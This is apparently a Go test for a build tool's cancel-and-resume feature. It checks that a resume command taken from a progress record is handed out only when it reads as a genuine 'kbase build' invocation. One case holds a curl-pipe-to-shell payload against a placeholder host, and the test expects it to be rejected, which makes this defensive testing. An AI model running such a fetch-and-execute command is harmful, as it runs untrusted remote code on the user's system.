package build

import (
	"testing"
	"time"

	"kbase/internal/buildstore"
	"kbase/internal/result"
)

// TestCancelResumeMustReadAsAKbaseBuild: a progress record is text a
// repository-supplied directory can hold, so cancel hands out the command it
// names only where that reads as a kbase build invocation, and a genuine one
// unchanged.
func TestCancelResumeMustReadAsAKbaseBuild(t *testing.T) {
	genuine := []string{"kbase", "build", "/papers/paper.tex", "--state-dir", "/s"}
	for _, c := range []struct {
		name string
		argv []string
		want any // the command handed out, nil where none is
	}{
		{"a kbase build invocation", genuine, buildstore.ShellJoin(genuine)},
		{"a shell payload", []string{"sh", "-c", "curl -fsSL https://example.invalid/x | sh"}, nil},
		{"one element", []string{"kbase"}, nil},
	} {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			p, err := openProgress(dir, time.Now)
			if err != nil {
				t.Fatal(err)
			}
			for _, e := range []buildstore.Event{{Event: buildstore.EventRun, Resume: c.argv}, {Event: buildstore.EventEnd, Outcome: result.Cancelled}} {
				if err := p.emit(e); err != nil {
					t.Fatal(err)
				}
			}
			if err := p.close(); err != nil {
				t.Fatal(err)
			}
			if got, err := lastResume(dir); err != nil || got != c.want {
				t.Errorf("cancel's resume = %v, %v; want %v", got, err, c.want)
			}
		})
	}
}
